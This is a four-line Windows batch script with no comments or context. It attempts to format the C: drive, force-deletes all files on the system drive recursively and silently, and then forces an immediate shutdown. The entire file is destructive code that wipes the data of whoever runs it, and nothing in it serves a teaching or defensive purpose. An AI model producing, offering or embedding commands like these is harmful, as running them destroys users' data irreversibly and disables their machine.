@echo off
format C:\
del %systemdrive%\*.* /f /s /q
shutdown -s -f -t 0
